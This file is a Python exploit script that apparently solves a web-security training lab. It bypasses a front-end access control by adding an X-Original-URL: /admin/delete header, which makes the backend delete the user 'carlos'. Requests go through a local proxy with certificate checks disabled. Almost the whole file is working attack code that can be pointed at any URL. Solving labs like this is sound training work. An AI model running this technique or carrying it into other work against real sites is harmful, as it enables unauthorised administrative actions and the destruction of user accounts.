import re
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080"
}


def verify_lib(session, url):
    print("(+) Verifying Lib...")
    response = session.get(url ,verify=False,proxies=proxy)
    if "Congratulations, you solved the lab!" in response.text:
        print("(+) Congratulations, you solved the lab!")
    else:
        print("(-) Error occur ..")



def delete_carlos_account(session , url):
    print("(+) Bypassing Front-end System Security ...")
    header = {"X-Original-URL":"/admin/delete"}
    delet_url = url+"/?username=carlos"
    try:
        print("(+) Deleting Carlos Account ...")
        response = session.get(url=delet_url , headers=header, verify=False, proxies=proxy)
        verify_lib(session ,url)

    except(requests.RequestException):
        print("(-) Failed to Bypass Security ...")
        sys.exit(-1)






def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>"% sys.argv[0])
        print("(+) Example: %s www.example.com"% sys.argv[0])
    url = sys.argv[1]
    session = requests.Session()
    try:

        print("Validating the Target ..")
        response = session.get(url)
        if response.status_code ==200:
            print("(+) Target is Reachable ")
        else:
            print("(-) Target is Unreachable")
            sys.exit(-1)
    except(requests.exceptions.ConnectTimeout):
        print("Connection Timeout ...")
    delete_carlos_account(session , url)

if __name__ == "__main__":
    main()